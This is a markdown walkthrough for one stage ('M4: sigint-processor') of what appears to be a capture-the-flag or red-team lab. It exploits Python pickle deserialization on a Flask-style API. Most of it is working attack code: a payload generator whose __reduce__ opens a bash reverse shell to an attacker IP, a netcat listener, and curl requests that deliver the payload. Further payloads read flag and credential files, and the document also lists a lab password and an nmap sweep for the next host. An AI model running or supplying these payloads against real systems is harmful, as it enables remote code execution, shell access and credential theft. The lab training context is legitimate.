# Red Team — M4: sigint-processor

**Vulnerability:** Python Pickle Deserialization RCE
**Technique:** T1059.006 — Python
**Entry:** API token `DSRT-SIG-4a7f2c91` from M3's `/opt/gateway/config.json`

---

## Step 1 — Enumerate the API

```bash
curl -s http://<M4-IP>:5000/api/status | python3 -m json.tool
# Shows available endpoints and auth requirement

curl -s http://<M4-IP>:5000/api/signal/stats \
  -H "Authorization: Bearer DSRT-SIG-4a7f2c91" | python3 -m json.tool
# Authenticated — works!
```

---

## Step 2 — Generate Malicious Pickle Payload

**On Kali / attack machine:**

```python
#!/usr/bin/env python3
# gen_payload.py
import pickle, os, base64

class RCE(object):
    def __reduce__(self):
        # Replace with your attacker IP and port
        cmd = "bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'"
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```

```bash
python3 gen_payload.py > payload.txt
cat payload.txt
```

---

## Step 3 — Start Listener

```bash
nc -lvnp 4444
```

---

## Step 4 — Send Malicious Payload

```bash
PAYLOAD=$(cat payload.txt)

curl -s -X POST http://<M4-IP>:5000/api/signal/process \
  -H "Authorization: Bearer DSRT-SIG-4a7f2c91" \
  -H "Content-Type: application/json" \
  -d "{\"payload\":\"${PAYLOAD}\",\"format\":\"binary\",\"source\":\"COL-A1\"}"
```
<img width="876" height="216" alt="image" src="https://github.com/user-attachments/assets/10d4b8f7-2ab7-4d6d-9cba-79bf0de75928" />

You should receive a shell callback on port 4444.

<img width="1066" height="264" alt="image" src="https://github.com/user-attachments/assets/da7bcf00-cfd3-4983-8ad5-5d8a7436b2ce" />

---

## Step 5 — Read Flag and Archive Credentials

```bash
# From reverse shell:
cat /opt/sigproc/classified/flag4.txt
cat /opt/processor/conf/archive.conf
# Shows: archivist : Arch1v3@D3S3RT
```

---

## Step 6 — Discover M5

```bash
# From M4 shell:
ip route
nmap -p 22,2049 --open 195.0.0.0/8 --min-rate 2000
```

**Proceed to M5 with:** `archivist : Arch1v3@D3S3RT`
Also note M5's IP for NFS mount in Step 6 of M5.

## OR
<img width="818" height="399" alt="image" src="https://github.com/user-attachments/assets/e9b6bb1c-c16b-4b0c-9a78-19ad57a88272" />

```python
# STEP 1: Generate payload file 
python3 << 'PYEOF' > /tmp/payload.txt
import pickle, os, base64

class RCE:
    def __reduce__(self):
        return (os.system, ('id > /tmp/rce_proof.txt',))

print(base64.b64encode(pickle.dumps(RCE())).decode())
PYEOF

echo "[*] Payload generated:"
cat /tmp/payload.txt
```

<img width="872" height="464" alt="image" src="https://github.com/user-attachments/assets/4b1929b9-67b6-4059-b1f6-1c115eacf975" />


```python
# STEP 2: Send payload 
curl -s -X POST http://195.0.0.58:5000/api/signal/process \
  -H "Authorization: Bearer DSRT-SIG-4a7f2c91" \
  -H "Content-Type: application/json" \
  -d "{\"payload\":\"$(cat /tmp/payload.txt)\",\"format\":\"binary\",\"source\":\"COL-A1\"}"
```
<img width="1070" height="166" alt="image" src="https://github.com/user-attachments/assets/f72de234-a30a-4fe8-b49d-916c6238fe63" />

```python
# Read flag4.txt
python3 << 'PYEOF' > /tmp/p_flag.txt
import pickle, subprocess, base64

class RCE:
    def __reduce__(self):
        return (subprocess.check_output, (['cat', '/opt/sigproc/classified/flag4.txt'],))

print(base64.b64encode(pickle.dumps(RCE())).decode())
PYEOF

curl -s -X POST http://195.0.0.58:5000/api/signal/process \
  -H "Authorization: Bearer DSRT-SIG-4a7f2c91" \
  -H "Content-Type: application/json" \
  -d "{\"payload\":\"$(cat /tmp/p_flag.txt)\",\"format\":\"binary\",\"source\":\"COL-A1\"}"
```
<img width="1419" height="334" alt="image" src="https://github.com/user-attachments/assets/25637b31-7ee3-4017-a94b-a348902e75fd" />

```python
# Read archive.conf (M5 credentials) 
python3 << 'PYEOF' > /tmp/p_creds.txt
import pickle, subprocess, base64

class RCE:
    def __reduce__(self):
        return (subprocess.check_output, (['cat', '/opt/processor/conf/archive.conf'],))

print(base64.b64encode(pickle.dumps(RCE())).decode())
PYEOF

curl -s -X POST http://195.0.0.58:5000/api/signal/process \
  -H "Authorization: Bearer DSRT-SIG-4a7f2c91" \
  -H "Content-Type: application/json" \
  -d "{\"payload\":\"$(cat /tmp/p_creds.txt)\",\"format\":\"binary\",\"source\":\"COL-A1\"}"
```
<img width="1462" height="360" alt="image" src="https://github.com/user-attachments/assets/8032aef9-b281-4734-9f76-5e6e347a527b" />

